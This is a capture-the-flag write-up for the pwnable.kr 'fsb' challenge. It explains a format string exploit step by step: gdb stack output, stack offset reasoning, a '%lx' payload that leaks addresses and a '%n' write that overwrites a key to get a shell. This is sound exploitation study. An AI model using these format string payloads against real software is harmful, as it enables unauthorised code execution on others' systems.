# pwnable.kr -- Rookiss -- fsb
If you are a expert of "%n" in `printf`, this challenge is easy.

## 1. Challenge
  > Isn't FSB almost obsolete in computer security?  
  > Anyway, have fun with it :)  
  >   
  > ssh fsb@pwnable.kr -p2222 (pw:guest)  

## 2. Solution
  * Connect via SFTP, get binary file `fsb` and source code `fsb.c`.

  * Open `fsb.c` you can see there is a FSB exploit in function `fsb`, LINE 25. And we have 4 chances to exploit it.

  * Run `fsb` in gdb, and make breakpoint at `*fsb+0xDC`. When trigger breakpoint, you can see:

    ```
    gdb-peda$ stack 128
    0000| 0xffffac90 --> 0x804a100 ("%-1$lx\n")
    0004| 0xffffac94 --> 0x804a100 ("%-1$lx\n")
    0008| 0xffffac98 --> 0x64 ('d')
    0012| 0xffffac9c --> 0x0
    0016| 0xffffaca0 --> 0x0
    0020| 0xffffaca4 --> 0x0
    0024| 0xffffaca8 --> 0x0
    0028| 0xffffacac --> 0x0
    0032| 0xffffacb0 --> 0x0
    0036| 0xffffacb4 --> 0x8048870 ("/bin/sh")
    0040| 0xffffacb8 --> 0x0
    0044| 0xffffacbc --> 0x1
    0048| 0xffffacc0 --> 0xffffd118 --> 0x0
    0052| 0xffffacc4 --> 0xffffdfda --> 0x6f682f00 ('')
    0056| 0xffffacc8 --> 0xfffface0 --> 0x0
    0060| 0xffffaccc --> 0xfffface4 --> 0x0
    0064| 0xffffacd0 --> 0x0
    0068| 0xffffacd4 --> 0x0
    0072| 0xffffacd8 --> 0xffffcf68 --> 0x0
    0076| 0xffffacdc --> 0x8048791 (<main+178>:	mov    eax,0x0)
    0080| 0xfffface0 --> 0x0
    0084| 0xfffface4 --> 0x0
    0088| 0xfffface8 --> 0x0
    0092| 0xffffacec --> 0x0
    0096| 0xffffacf0 --> 0x0
    ```

    As it is x86 platform, function `printf` uses `__cdecl` calling convention. So `"%1$lx"` can print the hex value stored in address `$esp + 4`. `"%11$lx"` prints `dword ptr[$esp + 11 * 4]` and so on.

    Watch the stack info, we can find that `$esp + 56` stores the address of function `fsb`'s first argument. And `$esp + 72` stores the previous `EBP`.

    Then in gdb, type `x /128xw *(void**)$ebp-128*4` to see the stack info of function `main`. We can find that `*(void**)$ebp-17*4`, which also is `prev_ebp-17*4`, stores the address of `key`.

  * So, the first time we use `"%14$lx,%18$lx"` to get the address of function `fsb`'s first argument and previous `EBP` named `prev_ebp`.

    Calculate the offset between `$esp` and `prev_ebp-17*4` and use `"%16c%klln"` to overwrite the value of `key` to 16, where `k` is the offset calculated out divided by 4.

  * After that `key` has been modified to 16 and we don't need the last of 4 exploit chances.

  * Finally wait for at least 3 second, and send `"16"` to get shell.
